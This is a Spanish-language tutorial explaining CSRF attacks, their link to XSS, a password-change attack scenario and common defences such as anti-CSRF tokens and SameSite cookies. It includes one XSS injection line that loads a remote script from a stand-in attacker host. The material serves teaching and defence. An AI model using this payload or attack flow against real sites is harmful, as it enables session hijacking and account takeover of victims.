# Cross-Site Request Forgery (CSRF) — primera toma de contacto

## La idea central

CSRF (*Cross-Site Request Forgery*, falsificación de solicitud entre sitios) explota un hecho fundamental de cómo funcionan las cookies de sesión: el navegador las **adjunta automáticamente** a cualquier petición que se haga hacia el dominio que las emitió, independientemente de qué página o script haya iniciado esa petición.

Esto significa que si una víctima tiene una sesión activa en `banco.com` y, mientras tanto, visita una página maliciosa que contiene código capaz de disparar una petición hacia `banco.com` (por ejemplo, un formulario auto-enviado, una imagen con `src` apuntando a una URL de acción, o JavaScript inyectado vía XSS), esa petición **viajará con la cookie de sesión de la víctima adjunta**, como si la hubiera iniciado ella misma de forma legítima.

## Relación con XSS

CSRF y XSS suelen mencionarse juntos porque a menudo se combinan: una vulnerabilidad XSS puede usarse precisamente para lanzar el ataque CSRF, ejecutando JavaScript que realiza peticiones autenticadas en nombre de la víctima sin que esta lo perciba. Pero CSRF también puede explotarse de forma independiente de XSS, simplemente alojando el código malicioso en cualquier página externa que la víctima visite mientras mantiene su sesión activa.

## Ejemplo de escenario de ataque

Un objetivo clásico de CSRF es forzar un cambio de contraseña o de correo electrónico de recuperación sin que la víctima se dé cuenta. El flujo típico:

1. El atacante identifica el endpoint y los parámetros que la aplicación legítima usa para cambiar la contraseña (por ejemplo, una petición `POST /change-password` con el parámetro `new_password`).
2. Construye una página (o un fragmento de código) que dispare automáticamente esa misma petición hacia la aplicación objetivo, con la nueva contraseña elegida por el atacante.
3. Atrae a la víctima —que ya tiene sesión iniciada en la aplicación objetivo— a visitar esa página o interactuar con el contenido malicioso (por ejemplo, un comentario que carga un script externo).
4. El navegador de la víctima ejecuta la petición, adjuntando automáticamente su cookie de sesión válida. La aplicación procesa el cambio como si la propia víctima lo hubiera solicitado.
5. El atacante ya conoce la nueva contraseña y puede iniciar sesión como la víctima.

```html
<!-- Ejemplo conceptual de carga de un script remoto que automatiza el ataque -->
"><script src=//atacante.example/exploit.js></script>
```

El archivo `exploit.js` contendría la lógica necesaria para replicar exactamente la petición legítima de cambio de contraseña, adaptada a la API concreta de la aplicación objetivo — lo que requiere que el atacante conozca de antemano cómo funciona ese flujo (otra razón por la que revisar el frontend, como vimos en el apartado anterior, es tan valioso).

## Por qué los administradores son un objetivo especialmente atractivo

Si el ataque se dirige contra un usuario con privilegios elevados (un administrador), las consecuencias se amplifican: los administradores suelen tener acceso a funcionalidades sensibles que, combinadas con CSRF, pueden derivar en comprometer por completo la aplicación o incluso el servidor que la aloja (por ejemplo, forzando la creación de un nuevo usuario administrador controlado por el atacante).

## Defensas habituales

| Mecanismo | Cómo ayuda |
|---|---|
| **Tokens anti-CSRF** | Un valor único e impredecible, generado por sesión o por petición, que debe incluirse en cada formulario/petición sensible. Una página externa no puede conocer ese token, por lo que su petición falsificada será rechazada. |
| **Atributo `SameSite` de las cookies** | `SameSite=Strict` o `Lax` indica al navegador que no envíe esa cookie en peticiones que se originan desde un sitio distinto, neutralizando gran parte de los ataques CSRF clásicos a nivel de navegador. |
| **Confirmación de contraseña actual** | Exigir la contraseña vigente antes de permitir cambiarla reduce el impacto, ya que el atacante normalmente no la conoce. |
| **Sanitización y validación de entrada** | Indirectamente relevante: si se previene XSS, se elimina uno de los vectores más habituales para lanzar CSRF de forma sigilosa dentro de la propia aplicación. |

Ninguna de estas medidas es infalible por separado — existen técnicas de bypass documentadas para varias de ellas en escenarios concretos —, por lo que se consideran capas de defensa complementarias, no sustitutos de un diseño seguro desde el origen. La [hoja de referencia de OWASP sobre prevención de CSRF](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) profundiza en los detalles de implementación de cada control.
